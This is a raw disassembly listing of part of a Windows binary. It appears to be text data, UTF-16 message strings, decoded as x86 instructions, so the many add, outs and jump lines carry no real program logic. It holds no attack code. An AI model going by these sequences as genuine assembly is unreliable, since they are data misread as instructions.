  408b4b:	add    BYTE PTR [esi+0x0],ch
  408b4e:	add    BYTE PTR [bx+si],ah
  408b51:	add    BYTE PTR [ebp+0x0],al
  408b54:	jbe    0x408b56
  408b56:	add    BYTE PTR gs:[esi+0x0],ch
  408b5a:	je     0x408b5c
  408b5c:	push   ebx
  408b5d:	add    BYTE PTR [ecx+0x0],ch
  408b60:	outs   dx,BYTE PTR ds:[esi]
  408b61:	add    BYTE PTR [ebx+0x0],ch
  408b64:	and    BYTE PTR [eax],al
  408b66:	data16 add BYTE PTR [edi+0x0],ch
  408b6a:	jb     0x408b6c
  408b6c:	and    BYTE PTR [eax],al
  408b6e:	daa    
  408b6f:	add    BYTE PTR [ebx+0x0],bh
  408b72:	xor    BYTE PTR [eax],al
  408b74:	jge    0x408b76
  408b76:	daa    
  408b77:	add    BYTE PTR [ecx],al
  408b79:	sbb    BYTE PTR [ecx+0x65004d],0x6d
  408b80:	add    BYTE PTR [edx+0x0],ah
  408b83:	add    BYTE PTR gs:[edx+0x0],dh
  408b87:	and    BYTE PTR [eax],al
  408b89:	daa    
  408b8a:	add    BYTE PTR [ebx+0x0],bh
  408b8d:	xor    BYTE PTR [eax],al
  408b8f:	jge    0x408b91
  408b91:	daa    
  408b92:	add    BYTE PTR [eax],ah
  408b94:	add    BYTE PTR [edx+0x0],dh
  408b97:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  408b9c:	add    BYTE PTR [edx+0x0],dh
  408b9f:	outs   dx,BYTE PTR ds:[esi]
  408ba0:	add    BYTE PTR [ebp+0x0],ah
  408ba3:	add    BYTE PTR fs:[eax],ah
  408ba6:	add    BYTE PTR [ecx+0x0],ah
  408ba9:	jae    0x408bab
  408bab:	and    BYTE PTR [eax],al
  408bad:	popa   
  408bae:	add    BYTE PTR [esi+0x0],ch
  408bb1:	and    BYTE PTR [eax],al
  408bb3:	outs   dx,DWORD PTR ds:[esi]
  408bb4:	add    BYTE PTR [eax+0x0],dh
  408bb7:	add    BYTE PTR gs:[edx+0x0],dh
  408bbb:	popa   
  408bbc:	add    BYTE PTR [eax+eax*1+0x69],dh
  408bc0:	add    BYTE PTR [edi+0x0],ch
  408bc3:	outs   dx,BYTE PTR ds:[esi]
  408bc4:	add    BYTE PTR [eax],ah
  408bc6:	add    BYTE PTR [edx+0x0],ah
  408bc9:	jne    0x408bcb
  408bcb:	je     0x408bcd
  408bcd:	and    BYTE PTR [eax],al
  408bcf:	arpl   WORD PTR [eax],ax
  408bd1:	popa   
  408bd2:	add    BYTE PTR [esi+0x0],ch
  408bd5:	outs   dx,BYTE PTR ds:[esi]
  408bd6:	add    BYTE PTR [edi+0x0],ch
  408bd9:	je     0x408bdb
  408bdb:	and    BYTE PTR [eax],al
  408bdd:	bound  eax,QWORD PTR [eax]
  408bdf:	add    BYTE PTR gs:[eax],ah
  408be2:	add    BYTE PTR [eax+eax*1+0x72],dh
  408be6:	add    BYTE PTR [ebp+0x0],ah
  408be9:	popa   
  408bea:	add    BYTE PTR [eax+eax*1+0x65],dh
  408bee:	add    BYTE PTR [eax+eax*1+0x20],ah
  408bf2:	add    BYTE PTR [ecx+0x0],ah
  408bf5:	jae    0x408bf7
  408bf7:	and    BYTE PTR [eax],al
  408bf9:	popa   
  408bfa:	add    BYTE PTR [eax],ah
  408bfc:	add    BYTE PTR [ebp+0x0],cl
  408bff:	add    BYTE PTR gs:[eax+eax*1+0x68],dh
  408c04:	add    BYTE PTR [edi+0x0],ch
  408c07:	add    BYTE PTR fs:[ecx+0x0],cl
  408c0b:	outs   dx,BYTE PTR ds:[esi]
  408c0c:	add    BYTE PTR [esi+0x0],ah
  408c0f:	outs   dx,DWORD PTR ds:[esi]
  408c10:	add    BYTE PTR [esi],ch
  408c12:	add    BYTE PTR [ecx],al
  408c14:	push   ebp
  408c15:	dec    ebp
  408c16:	add    BYTE PTR [ebp+0x0],ah
  408c19:	ins    DWORD PTR es:[edi],dx
  408c1a:	add    BYTE PTR [edx+0x0],ah
  408c1d:	add    BYTE PTR gs:[edx+0x0],dh
  408c21:	and    BYTE PTR [eax],al
  408c23:	daa    
  408c24:	add    BYTE PTR [ebx+0x0],bh
  408c27:	xor    BYTE PTR [eax],al
  408c29:	jge    0x408c2b
  408c2b:	daa    
  408c2c:	add    BYTE PTR [eax],ah
  408c2e:	add    BYTE PTR [ebx+0x0],ah
  408c31:	popa   
  408c32:	add    BYTE PTR [esi+0x0],ch
  408c35:	outs   dx,BYTE PTR ds:[esi]
  408c36:	add    BYTE PTR [edi+0x0],ch
  408c39:	je     0x408c3b
  408c3b:	and    BYTE PTR [eax],al
  408c3d:	bound  eax,QWORD PTR [eax]
  408c3f:	add    BYTE PTR gs:[eax],ah
  408c42:	add    BYTE PTR [ebx+0x0],ah
  408c45:	popa   
  408c46:	add    BYTE PTR [ebx+0x0],dh
  408c49:	je     0x408c4b
  408c4b:	and    BYTE PTR [eax],al
  408c4d:	je     0x408c4f
  408c4f:	outs   dx,DWORD PTR ds:[esi]
  408c50:	add    BYTE PTR [eax],ah
  408c52:	add    BYTE PTR [ebp+0x0],cl
  408c55:	add    BYTE PTR gs:[eax+eax*1+0x68],dh
  408c5a:	add    BYTE PTR [edi+0x0],ch
  408c5d:	add    BYTE PTR fs:[ecx+0x0],cl
  408c61:	outs   dx,BYTE PTR ds:[esi]
  408c62:	add    BYTE PTR [esi+0x0],ah
  408c65:	outs   dx,DWORD PTR ds:[esi]
  408c66:	add    BYTE PTR [esi],ch
  408c68:	add    BYTE PTR [ecx],al
  408c6a:	or     eax,0x65006d
  408c6f:	ins    DWORD PTR es:[edi],dx
  408c70:	add    BYTE PTR [edx+0x0],ah
  408c73:	add    BYTE PTR gs:[edx+0x0],dh
  408c77:	add    BYTE PTR [ebx],ah
  408c79:	push   eax
  408c7a:	add    BYTE PTR [ecx+0x0],ah
  408c7d:	jb     0x408c7f
  408c7f:	popa   
  408c80:	add    BYTE PTR [ebp+0x0],ch
  408c83:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  408c88:	add    BYTE PTR [edx+0x0],dh
  408c8b:	inc    edx
  408c8c:	add    BYTE PTR [ecx+0x0],ch
  408c8f:	outs   dx,BYTE PTR ds:[esi]
  408c90:	add    BYTE PTR [eax+eax*1+0x69],ah
  408c94:	add    BYTE PTR [esi+0x0],ch
  408c97:	add    BYTE PTR [bp+di+0x0],dh
  408c9b:	add    BYTE PTR [ebx],cl
  408c9d:	push   esi
  408c9e:	add    BYTE PTR [ecx+0x0],ah
  408ca1:	ins    BYTE PTR es:[edi],dx
  408ca2:	add    BYTE PTR [ebp+0x0],dh
  408ca5:	add    BYTE PTR gs:[eax],al
  408ca8:	pop    ss
  408ca9:	push   edx
  408caa:	add    BYTE PTR [ebp+0x0],ah
  408cad:	je     0x408caf
  408caf:	jne    0x408cb1
  408cb1:	jb     0x408cb3
  408cb3:	outs   dx,BYTE PTR ds:[esi]
  408cb4:	add    BYTE PTR [esi+0x0],dl
  408cb7:	popa   
  408cb8:	add    BYTE PTR [eax+eax*1+0x75],ch
  408cbc:	add    BYTE PTR [ebp+0x0],ah
  408cbf:	add    BYTE PTR [ebx],bl
  408cc1:	sub    BYTE PTR [eax],al
  408cc3:	push   edx
  408cc4:	add    BYTE PTR [ebp+0x0],ah
  408cc7:	je     0x408cc9
  408cc9:	jne    0x408ccb
  408ccb:	jb     0x408ccd
  408ccd:	outs   dx,BYTE PTR ds:[esi]
  408cce:	add    BYTE PTR [esi+0x0],dl
  408cd1:	popa   
  408cd2:	add    BYTE PTR [eax+eax*1+0x75],ch
  408cd6:	add    BYTE PTR [ebp+0x0],ah
  408cd9:	sub    DWORD PTR [eax],eax
  408cdb:	add    BYTE PTR [ecx],ah
  408cdd:	dec    edi
  408cde:	add    BYTE PTR [esi+0x0],ch
  408ce1:	dec    ebp
  408ce2:	add    BYTE PTR [ebp+0x0],ah
  408ce5:	je     0x408ce7
  408ce7:	push   0x64006f00
  408cec:	add    BYTE PTR [ecx+0x0],cl
  408cef:	outs   dx,BYTE PTR ds:[esi]
  408cf0:	add    BYTE PTR [esi+0x0],dh
  408cf3:	outs   dx,DWORD PTR ds:[esi]
  408cf4:	add    BYTE PTR [ebx+0x0],ch
  408cf7:	imul   eax,DWORD PTR [eax],0x67006e
  408cfd:	add    BYTE PTR [ebx],al
  408cff:	add    BYTE PTR gs:[eax],al
  408d02:	pop    ds
  408d03:	dec    edi
  408d04:	add    BYTE PTR [esi+0x0],ch
  408d07:	dec    ebp
  408d08:	add    BYTE PTR [ebp+0x0],ah
  408d0b:	je     0x408d0d
  408d0d:	push   0x64006f00
  408d12:	add    BYTE PTR [ecx+0x0],cl
  408d15:	outs   dx,BYTE PTR ds:[esi]
  408d16:	add    BYTE PTR [esi+0x0],dh
  408d19:	outs   dx,DWORD PTR ds:[esi]
  408d1a:	add    BYTE PTR [ebx+0x0],ch
  408d1d:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  408d22:	or     eax,0x690048
  408d27:	add    BYTE PTR fs:[eax+eax*1+0x65],ah
  408d2c:	add    BYTE PTR [esi+0x0],ch
  408d2f:	add    BYTE PTR [ecx+0x43],al
  408d32:	add    BYTE PTR [ecx+0x0],ah
  408d35:	outs   dx,BYTE PTR ds:[esi]
  408d36:	add    BYTE PTR [esi+0x0],ch
  408d39:	outs   dx,DWORD PTR ds:[esi]
  408d3a:	add    BYTE PTR [eax+eax*1+0x20],dh
  408d3e:	add    BYTE PTR [ebx+0x0],dh
  408d41:	add    BYTE PTR gs:[eax+eax*1+0x20],dh
  408d46:	add    BYTE PTR [ebx+0x0],bh
  408d49:	xor    BYTE PTR [eax],al
  408d4b:	jge    0x408d4d
  408d4d:	and    BYTE PTR [eax],al
  408d4f:	outs   dx,DWORD PTR ds:[esi]
  408d50:	add    BYTE PTR [esi+0x0],ch
  408d53:	and    BYTE PTR [eax],al
  408d55:	popa   
  408d56:	add    BYTE PTR [eax],ah
  408d58:	add    BYTE PTR [eax+eax*1+0x65],ah
  408d5c:	add    BYTE PTR [edx+0x0],dh
  408d5f:	imul   eax,DWORD PTR [eax],0x650076
  408d65:	add    BYTE PTR fs:[eax],ah
  408d68:	add    BYTE PTR [ebx+0x0],bh
  408d6b:	xor    DWORD PTR [eax],eax
  408d6d:	jge    0x408d6f
  408d6f:	add    BYTE PTR cs:[eax],al
  408d72:	sbb    ecx,DWORD PTR [ecx+0x0]
  408d75:	outs   dx,BYTE PTR ds:[esi]
  408d76:	add    BYTE PTR [eax+eax*1+0x65],dh
  408d7a:	add    BYTE PTR [edx+0x0],dh
  408d7d:	data16 add BYTE PTR [ecx+0x0],ah
  408d81:	arpl   WORD PTR [eax],ax
  408d83:	add    BYTE PTR gs:[eax+eax*1+0x79],dl
  408d88:	add    BYTE PTR [eax+0x0],dh
  408d8b:	add    BYTE PTR gs:[eax],al
  408d8e:	aaa    
  408d8f:	dec    eax
  408d90:	add    BYTE PTR [ecx+0x0],ah
  408d93:	outs   dx,BYTE PTR ds:[esi]
  408d94:	add    BYTE PTR [eax+eax*1+0x6c],ah
  408d98:	add    BYTE PTR [ebp+0x0],ah
  408d9b:	inc    ebp
  408d9c:	add    BYTE PTR [eax+0x0],bh
  408d9f:	je     0x408da1
  408da1:	add    BYTE PTR gs:[edx+0x0],dh
  408da5:	outs   dx,BYTE PTR ds:[esi]
  408da6:	add    BYTE PTR [ecx+0x0],ah
  408da9:	ins    BYTE PTR es:[edi],dx
  408daa:	add    BYTE PTR [ebp+0x0],al
  408dad:	jbe    0x408daf
  408daf:	add    BYTE PTR gs:[esi+0x0],ch
  408db3:	je     0x408db5
  408db5:	inc    ecx
  408db6:	add    BYTE PTR [ebx+0x0],ah
  408db9:	je     0x408dbb
  408dbb:	imul   eax,DWORD PTR [eax],0x690076
  408dc1:	je     0x408dc3
  408dc3:	jns    0x408dc5
  408dc5:	add    BYTE PTR ds:0x610043,dh
  408dcb:	ins    BYTE PTR es:[edi],dx
  408dcc:	add    BYTE PTR [eax+eax*1+0x45],ch
  408dd0:	add    BYTE PTR [eax+0x0],bh
  408dd3:	je     0x408dd5
  408dd5:	add    BYTE PTR gs:[edx+0x0],dh
  408dd9:	outs   dx,BYTE PTR ds:[esi]
  408dda:	add    BYTE PTR [ecx+0x0],ah
  408ddd:	ins    BYTE PTR es:[edi],dx
  408dde:	add    BYTE PTR [ebp+0x0],cl
  408de1:	add    BYTE PTR gs:[eax+eax*1+0x68],dh
  408de6:	add    BYTE PTR [edi+0x0],ch
  408de9:	add    BYTE PTR fs:[ecx+0x0],al
  408ded:	arpl   WORD PTR [eax],ax
  408def:	je     0x408df1
  408df1:	imul   eax,DWORD PTR [eax],0x690076
  408df7:	je     0x408df9
  408df9:	jns    0x408dfb
  408dfb:	add    BYTE PTR [ebx],dl
  408dfd:	inc    ebp
  408dfe:	add    BYTE PTR [esi+0x0],dh
  408e01:	add    BYTE PTR gs:[esi+0x0],ch
  408e05:	je     0x408e07
  408e07:	dec    esi
  408e08:	add    BYTE PTR [ecx+0x0],ah
  408e0b:	ins    DWORD PTR es:[edi],dx
  408e0c:	add    BYTE PTR [ebp+0x0],ah
  408e0f:	add    BYTE PTR ds:0x65004d,dl
  408e15:	je     0x408e17
  408e17:	push   0x64006f00
  408e1c:	add    BYTE PTR [esi+0x0],cl
  408e1f:	popa   
  408e20:	add    BYTE PTR [ebp+0x0],ch
  408e23:	add    BYTE PTR gs:[eax],al
  408e26:	sbb    DWORD PTR [ebx+0x0],edi
  408e29:	xor    BYTE PTR [eax],al
  408e2b:	jge    0x408e2d
  408e2d:	push   eax
  408e2e:	add    BYTE PTR [ecx+0x0],ah
  408e31:	jb     0x408e33
  408e33:	popa   
  408e34:	add    BYTE PTR [ebp+0x0],ch
  408e37:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  408e3c:	add    BYTE PTR [edx+0x0],dh
  408e3f:	add    BYTE PTR [ecx],dl
  408e41:	push   edx
  408e42:	add    BYTE PTR [ebp+0x0],ah
  408e45:	add    BYTE PTR [bx+di+0x0],ch
  408e49:	jae    0x408e4b
  408e4b:	je     0x408e4d
  408e4d:	add    BYTE PTR gs:[edx+0x0],dh
  408e51:	add    BYTE PTR [ecx],dl
  408e53:	push   edx
  408e54:	add    BYTE PTR [ebp+0x0],ah
  408e57:	jno    0x408e59
  408e59:	jne    0x408e5b
  408e5b:	imul   eax,DWORD PTR [eax],0x650072
  408e61:	add    BYTE PTR fs:[eax],al
  408e64:	adc    DWORD PTR [ebx+0x0],edx
  408e67:	add    BYTE PTR gs:[eax+eax*1+0x56],dh
  408e6c:	add    BYTE PTR [ecx+0x0],ah
  408e6f:	ins    BYTE PTR es:[edi],dx
  408e70:	add    BYTE PTR [ebp+0x0],dh
  408e73:	add    BYTE PTR gs:[eax],al
  408e76:	adc    DWORD PTR [edi+0x0],eax
  408e79:	add    BYTE PTR gs:[eax+eax*1+0x56],dh
  408e7e:	add    BYTE PTR [ecx+0x0],ah
  408e81:	ins    BYTE PTR es:[edi],dx
  408e82:	add    BYTE PTR [ebp+0x0],dh
  408e85:	add    BYTE PTR gs:[eax],al
  408e88:	pop    ss
  408e89:	jnp    0x408e8b
  408e8b:	xor    BYTE PTR [eax],al
  408e8d:	jge    0x408e8f
  408e8f:	push   eax
  408e90:	add    BYTE PTR [edx+0x0],dh
  408e93:	outs   dx,DWORD PTR ds:[esi]
  408e94:	add    BYTE PTR [eax+0x0],dh
  408e97:	add    BYTE PTR gs:[edx+0x0],dh
  408e9b:	je     0x408e9d
  408e9d:	jns    0x408e9f
  408e9f:	add    BYTE PTR [edi],dl
  408ea1:	jnp    0x408ea3
  408ea3:	xor    BYTE PTR [eax],al
  408ea5:	jge    0x408ea7
  408ea7:	add    BYTE PTR cs:[ecx+0x0],cl
  408eab:	outs   dx,BYTE PTR ds:[esi]
  408eac:	add    BYTE PTR [esi+0x0],dh
  408eaf:	outs   dx,DWORD PTR ds:[esi]
  408eb0:	add    BYTE PTR [ebx+0x0],ch
  408eb3:	add    BYTE PTR gs:[ebx+0x0],dh
  408eb7:	add    BYTE PTR [eax+0x65004d8f],al
  408ebd:	add    BYTE PTR [ebp+0x0],ch
  408ec0:	bound  eax,QWORD PTR [eax]
  408ec2:	add    BYTE PTR gs:[edx+0x0],dh
  408ec6:	and    BYTE PTR [eax],al
  408ec8:	daa    
  408ec9:	add    BYTE PTR [ebx+0x0],bh
  408ecc:	xor    BYTE PTR [eax],al
  408ece:	jge    0x408ed0
  408ed0:	daa    
  408ed1:	add    BYTE PTR [eax],ah
  408ed3:	add    BYTE PTR [edx+0x0],dh
  408ed6:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  408edb:	add    BYTE PTR [edx+0x0],dh
  408ede:	outs   dx,BYTE PTR ds:[esi]
  408edf:	add    BYTE PTR [ebp+0x0],ah
  408ee2:	add    BYTE PTR fs:[eax],ah
  408ee5:	add    BYTE PTR [ecx+0x0],ah
  408ee8:	jae    0x408eea
  408eea:	and    BYTE PTR [eax],al
  408eec:	popa   
  408eed:	add    BYTE PTR [esi+0x0],ch
  408ef0:	and    BYTE PTR [eax],al
  408ef2:	add    BYTE PTR gs:[esi+0x0],dh
  408ef6:	add    BYTE PTR gs:[esi+0x0],ch
  408efa:	je     0x408efc
  408efc:	and    BYTE PTR [eax],al
  408efe:	bound  eax,QWORD PTR [eax]
  408f00:	jne    0x408f02
  408f02:	je     0x408f04
  408f04:	and    BYTE PTR [eax],al
  408f06:	arpl   WORD PTR [eax],ax
  408f08:	popa   
  408f09:	add    BYTE PTR [esi+0x0],ch
  408f0c:	outs   dx,BYTE PTR ds:[esi]
  408f0d:	add    BYTE PTR [edi+0x0],ch
  408f10:	je     0x408f12
  408f12:	and    BYTE PTR [eax],al
  408f14:	bound  eax,QWORD PTR [eax]
  408f16:	add    BYTE PTR gs:[eax],ah
  408f19:	add    BYTE PTR [eax+eax*1+0x72],dh
  408f1d:	add    BYTE PTR [ebp+0x0],ah
  408f20:	popa   
  408f21:	add    BYTE PTR [eax+eax*1+0x65],dh
  408f25:	add    BYTE PTR [eax+eax*1+0x20],ah
  408f29:	add    BYTE PTR [ecx+0x0],ah
  408f2c:	jae    0x408f2e
  408f2e:	and    BYTE PTR [eax],al
  408f30:	popa   
  408f31:	add    BYTE PTR [eax],ah
  408f33:	add    BYTE PTR [ebp+0x0],al
  408f36:	jbe    0x408f38
  408f38:	add    BYTE PTR gs:[esi+0x0],ch
  408f3c:	je     0x408f3e
  408f3e:	dec    ecx
  408f3f:	add    BYTE PTR [esi+0x0],ch
  408f42:	data16 add BYTE PTR [edi+0x0],ch
  408f46:	add    BYTE PTR cs:[ecx],al
  408f49:	push   ebx
  408f4a:	dec    ebp
  408f4b:	add    BYTE PTR [ebp+0x0],ah
  408f4e:	ins    DWORD PTR es:[edi],dx
  408f4f:	add    BYTE PTR [edx+0x0],ah
  408f52:	add    BYTE PTR gs:[edx+0x0],dh
  408f56:	and    BYTE PTR [eax],al
  408f58:	daa    
  408f59:	add    BYTE PTR [ebx+0x0],bh
  408f5c:	xor    BYTE PTR [eax],al
  408f5e:	jge    0x408f60
  408f60:	daa    
  408f61:	add    BYTE PTR [eax],ah
  408f63:	add    BYTE PTR [ebx+0x0],ah
  408f66:	popa   
  408f67:	add    BYTE PTR [esi+0x0],ch
  408f6a:	outs   dx,BYTE PTR ds:[esi]
  408f6b:	add    BYTE PTR [edi+0x0],ch
  408f6e:	je     0x408f70
  408f70:	and    BYTE PTR [eax],al
  408f72:	bound  eax,QWORD PTR [eax]
  408f74:	add    BYTE PTR gs:[eax],ah
  408f77:	add    BYTE PTR [ebx+0x0],ah
  408f7a:	popa   
  408f7b:	add    BYTE PTR [ebx+0x0],dh
  408f7e:	je     0x408f80
  408f80:	and    BYTE PTR [eax],al
  408f82:	je     0x408f84
  408f84:	outs   dx,DWORD PTR ds:[esi]
  408f85:	add    BYTE PTR [eax],ah
  408f87:	add    BYTE PTR [ebp+0x0],al
  408f8a:	jbe    0x408f8c
  408f8c:	add    BYTE PTR gs:[esi+0x0],ch
  408f90:	je     0x408f92
  408f92:	dec    ecx
  408f93:	add    BYTE PTR [esi+0x0],ch
  408f96:	data16 add BYTE PTR [edi+0x0],ch
  408f9a:	add    BYTE PTR cs:[ecx],al
  408f9d:	xor    eax,0x30007b
  408fa2:	jge    0x408fa4
  408fa4:	add    BYTE PTR cs:[ebx+0x0],bh
  408fa8:	xor    DWORD PTR [eax],eax
  408faa:	jge    0x408fac
  408fac:	and    BYTE PTR [eax],al
  408fae:	imul   eax,DWORD PTR [eax],0x200073
  408fb4:	outs   dx,BYTE PTR ds:[esi]
  408fb5:	add    BYTE PTR [edi+0x0],ch
  408fb8:	je     0x408fba
  408fba:	and    BYTE PTR [eax],al
  408fbc:	outs   dx,DWORD PTR ds:[esi]
  408fbd:	add    BYTE PTR [esi+0x0],ah
  408fc0:	and    BYTE PTR [eax],al
  408fc2:	je     0x408fc4
  408fc4:	jns    0x408fc6
  408fc6:	jo     0x408fc8
  408fc8:	add    BYTE PTR gs:[eax],ah
  408fcb:	add    BYTE PTR [ebx+0x0],bh
  408fce:	xor    al,BYTE PTR [eax]
  408fd0:	jge    0x408fd2
  408fd2:	add    BYTE PTR [ebx+0x7b],ah
  408fd5:	add    BYTE PTR [eax],dh
  408fd7:	add    BYTE PTR [ebp+0x0],bh
  408fda:	add    BYTE PTR cs:[ebx+0x0],bh
  408fde:	xor    DWORD PTR [eax],eax
  408fe0:	jge    0x408fe2
  408fe2:	and    BYTE PTR [eax],al
  408fe4:	add    BYTE PTR fs:[ecx+0x0],ch
  408fe8:	add    BYTE PTR fs:[eax],ah
  408feb:	add    BYTE PTR [esi+0x0],ch
  408fee:	outs   dx,DWORD PTR ds:[esi]
  408fef:	add    BYTE PTR [eax+eax*1+0x20],dh
  408ff3:	add    BYTE PTR [eax+0x0],ch
  408ff6:	popa   
  408ff7:	add    BYTE PTR [esi+0x0],dh
  408ffa:	add    BYTE PTR gs:[eax],ah
  408ffd:	add    BYTE PTR [ebp+0x0],ah
  409000:	js     0x409002
  409002:	popa   
  409003:	add    BYTE PTR [ebx+0x0],ah
  409006:	je     0x409008
  409008:	ins    BYTE PTR es:[edi],dx
  409009:	add    BYTE PTR [ecx+0x0],bh
  40900c:	and    BYTE PTR [eax],al
  40900e:	outs   dx,DWORD PTR ds:[esi]
  40900f:	add    BYTE PTR [esi+0x0],ch
  409012:	add    BYTE PTR gs:[eax],ah
  409015:	add    BYTE PTR [edi+0x0],ah
  409018:	add    BYTE PTR gs:[esi+0x0],ch
  40901c:	add    BYTE PTR gs:[edx+0x0],dh
  409020:	imul   eax,DWORD PTR [eax],0x200063
  409026:	popa   
  409027:	add    BYTE PTR [edx+0x0],dh
  40902a:	add    BYTE PTR [di+0x0],dh
  40902e:	ins    DWORD PTR es:[edi],dx
  40902f:	add    BYTE PTR [ebp+0x0],ah
  409032:	outs   dx,BYTE PTR ds:[esi]
  409033:	add    BYTE PTR [eax+eax*1+0x0],dh
  409037:	ja     0x4090b4
  409039:	add    BYTE PTR [eax],dh
  40903b:	add    BYTE PTR [ebp+0x0],bh
  40903e:	add    BYTE PTR cs:[ebx+0x0],bh
  409042:	xor    DWORD PTR [eax],eax
  409044:	jge    0x409046
  409046:	and    BYTE PTR [eax],al
  409048:	push   0x73006100
  40904d:	add    BYTE PTR [eax],ah
  40904f:	add    BYTE PTR [edi+0x0],ah
  409052:	add    BYTE PTR gs:[esi+0x0],ch
  409056:	add    BYTE PTR gs:[edx+0x0],dh
  40905a:	imul   eax,DWORD PTR [eax],0x200063
  409060:	je     0x409062
  409062:	jns    0x409064
  409064:	jo     0x409066
  409066:	add    BYTE PTR gs:[eax],ah
  409069:	add    BYTE PTR [ebx+0x0],bh
  40906c:	xor    al,BYTE PTR [eax]
  40906e:	jge    0x409070
  409070:	and    BYTE PTR [eax],al
  409072:	ja     0x409074
  409074:	push   0x63006900
  409079:	add    BYTE PTR [eax+0x0],ch
  40907c:	and    BYTE PTR [eax],al
  40907e:	add    BYTE PTR fs:[edi+0x0],ch
  409082:	add    BYTE PTR gs:[ebx+0x0],dh
  409086:	and    BYTE PTR [eax],al
  409088:	outs   dx,BYTE PTR ds:[esi]
  409089:	add    BYTE PTR [edi+0x0],ch
  40908c:	je     0x40908e
  40908e:	and    BYTE PTR [eax],al
  409090:	add    BYTE PTR fs:[ebp+0x0],ah
  409094:	jb     0x409096
  409096:	imul   eax,DWORD PTR [eax],0x650076
  40909c:	and    BYTE PTR [eax],al
  40909e:	data16 add BYTE PTR [edx+0x0],dh
  4090a2:	outs   dx,DWORD PTR ds:[esi]
  4090a3:	add    BYTE PTR [ebp+0x0],ch
  4090a6:	and    BYTE PTR [eax],al
  4090a8:	jnp    0x4090aa
  4090aa:	xor    eax,DWORD PTR [eax]
  4090ac:	jge    0x4090ae
  4090ae:	add    BYTE PTR ds:0x650053,cl
  4090b4:	outs   dx,BYTE PTR ds:[esi]
  4090b5:	add    BYTE PTR [eax+eax*1+0x65],ah
  4090b9:	add    BYTE PTR [edx+0x0],dh
  4090bc:	add    BYTE PTR [ebx],al
  4090be:	inc    ebp
  4090bf:	add    BYTE PTR [eax],al
  4090c1:	packsswb mm0,QWORD PTR [eax]
  4090c4:	popa   
  4090c5:	add    BYTE PTR [ebx+0x0],dh
  4090c8:	je     0x4090ca
  4090ca:	add    BYTE PTR gs:[eax+eax*1+0x45],ah
  4090cf:	add    BYTE PTR [eax],al
  4090d1:	adc    ecx,DWORD PTR [edi+0x0]
  4090d4:	outs   dx,BYTE PTR ds:[esi]
  4090d5:	add    BYTE PTR [ecx+0x0],cl
  4090d8:	outs   dx,BYTE PTR ds:[esi]
  4090d9:	add    BYTE PTR [esi+0x0],dh
  4090dc:	outs   dx,DWORD PTR ds:[esi]
  4090dd:	add    BYTE PTR [ebx+0x0],ch
  4090e0:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  4090e5:	or     eax,0x650073
  4090ea:	outs   dx,BYTE PTR ds:[esi]
  4090eb:	add    BYTE PTR [eax+eax*1+0x65],ah
  4090ef:	add    BYTE PTR [edx+0x0],dh
  4090f2:	add    BYTE PTR [ebx],dl
  4090f4:	jnp    0x4090f6
  4090f6:	xor    BYTE PTR [eax],al
  4090f8:	jge    0x4090fa
  4090fa:	add    BYTE PTR cs:[ebx+0x0],dl
  4090fe:	imul   eax,DWORD PTR [eax],0x6b006e
  409104:	jae    0x409106
  409106:	add    BYTE PTR [edi],cl
  409108:	inc    ebp
  409109:	add    BYTE PTR [edx+0x0],dl
  40910c:	push   edx
  40910d:	add    BYTE PTR [edi+0x0],cl
  409110:	push   edx
  409111:	add    BYTE PTR [edx],bh
  409113:	add    BYTE PTR [eax],ah
  409115:	add    BYTE PTR [eax],al
  409117:	pop    es
  409118:	add    BYTE PTR fs:[ecx+0x0],ch
  40911c:	jb     0x40911e
  40911e:	add    BYTE PTR [ebx],al
  409120:	add    BYTE PTR cs:[eax],al
  409123:	pop    ds
  409124:	push   edi
  409125:	add    BYTE PTR [edx+0x0],dh
  409128:	outs   dx,DWORD PTR ds:[esi]
  409129:	add    BYTE PTR [eax+eax*1+0x65],dh
  40912d:	add    BYTE PTR [eax],ah
  40912f:	add    BYTE PTR [esi+0x0],ah
  409132:	imul   eax,DWORD PTR [eax],0x65006c
  409138:	cmp    al,BYTE PTR [eax]
  40913a:	and    BYTE PTR [eax],al
  40913c:	jnp    0x40913e
  40913e:	xor    BYTE PTR [eax],al
  409140:	jge    0x409142
  409142:	add    BYTE PTR ds:0x230043,al
  409148:	add    BYTE PTR [ebx],cl
  40914a:	jbe    0x40914c
  40914c:	popa   
  40914d:	add    BYTE PTR [eax+eax*1+0x75],ch
  409151:	add    BYTE PTR [ebp+0x0],ah
  409154:	add    BYTE PTR [ebx+0x4d],cl
  409157:	add    BYTE PTR [ecx+0x0],ch
  40915a:	arpl   WORD PTR [eax],ax
  40915c:	jb     0x40915e
  40915e:	outs   dx,DWORD PTR ds:[esi]
  40915f:	add    BYTE PTR [ebx+0x0],dh
  409162:	outs   dx,DWORD PTR ds:[esi]
  409163:	add    BYTE PTR [esi+0x0],ah
  409166:	je     0x409168
  409168:	add    BYTE PTR cs:[edi+0x0],dl
  40916c:	outs   dx,DWORD PTR ds:[esi]
  40916d:	add    BYTE PTR [edx+0x0],dh
  409170:	imul   eax,DWORD PTR [eax],0x66
  409173:	add    BYTE PTR [eax+eax*1+0x6f],ch
  409177:	add    BYTE PTR [edi+0x0],dh
  40917a:	add    BYTE PTR cs:[eax+eax*1+0x6f],dl
  40917f:	add    BYTE PTR [edi+0x0],ch
  409182:	ins    BYTE PTR es:[edi],dx
  409183:	add    BYTE PTR [ebx+0x0],dh
  409186:	add    BYTE PTR cs:[ebp+0x0],al
  40918a:	jb     0x40918c
  40918c:	jb     0x40918e
  40918e:	outs   dx,DWORD PTR ds:[esi]
  40918f:	add    BYTE PTR [edx+0x0],dh
  409192:	push   ebx
  409193:	add    BYTE PTR [eax+eax*1+0x72],dh
  409197:	add    BYTE PTR [ecx+0x0],ch
  40919a:	outs   dx,BYTE PTR ds:[esi]
  40919b:	add    BYTE PTR [edi+0x0],ah
  40919e:	jae    0x4091a0
  4091a0:	add    BYTE PTR [ebx],ah
  4091a2:	inc    esp
  4091a3:	add    BYTE PTR [ecx+0x0],ch
  4091a6:	jb     0x4091a8
  4091a8:	add    BYTE PTR gs:[ebx+0x0],ah
  4091ac:	je     0x4091ae
  4091ae:	outs   dx,DWORD PTR ds:[esi]
  4091af:	add    BYTE PTR [edx+0x0],dh
  4091b2:	jns    0x4091b4
  4091b4:	dec    esi
  4091b5:	add    BYTE PTR [edi+0x0],ch
  4091b8:	je     0x4091ba
